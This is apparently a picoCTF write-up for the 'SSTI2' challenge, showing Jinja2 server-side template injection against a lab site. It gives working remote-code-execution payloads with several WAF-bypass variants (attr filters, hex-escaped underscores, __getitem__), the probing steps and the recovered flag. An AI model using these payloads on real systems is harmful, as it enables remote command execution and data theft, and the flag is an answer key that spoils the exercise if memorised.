# picoGym Level 488: SSTI2
Source: https://play.picoctf.org/practice/challenge/488

## Goal
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem<br>
I heard templating is a cool and modular way to build web apps! Check out my website here!<br>
http://shape-facility.picoctf.net:54976/

## What I learned
```
Google: pyjail ssti https://onsecurity.io/article/server-side-template-injection-with-jinja2/
---
RCE bypassing as much as I possibly can.
I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can.
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

If the waf blocks ".":
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

If the waf blocks "." and "_":
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

Bypassing the blocks on ".", "_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033):
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}} 👀
---

Jinga Filters: https://jinja.palletsprojects.com/en/stable/templates/#list-of-builtin-filters
Jinja filters work same as most Python built-ins methods
Jinja’s attr filter only looks up attributes, not items
__builtins__ and __import__ have to use __getitem__ built-in
foo.bar                 foo|attr('bar')
request.application.__globals__ to get Python built-ins
Find RCE Without `eval()` or `exec()`:

.       →       |attr()             Bypasses WAFs blocking `request.application.__globals__
_       →       \x5f                Bypasses filters blocking `__globals__`, `__builtins__`, and `__import__`
[]      →       __getitem__()       Evades protections blocking `__builtins__[‘__import__’]
import__(‘os’).popen(‘id’).read()   Avoids blocked `os.system()` and `subprocess.Popen()`
```

## Solution
```
https://webshell.picoctf.org/

Input: {{7+7}}
Output: 14 (Vulnerability)

# Note: Payloads using magic methods are blacklisted
Input: {{ cycler.__init__.__globals__.os.popen('whoami').read() }} ⌨️
Output: Stop trying to break me >:(

Input: {{config.__class__.__init__.__globals__[‘os’].popen(‘cat flag’).read()}}
Output: Stop trying to break me >:(

# Try Figure out what blacklisted
Input: {{a}}
Output:                             # Nothing means not blacklisted
Input: {{.}}
Output: Stop trying to break me >:(

# New Payload
Input: {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}  
Output: picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}
```

## Flag
picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}

## Continue
[Continue](./picoGym0304.md)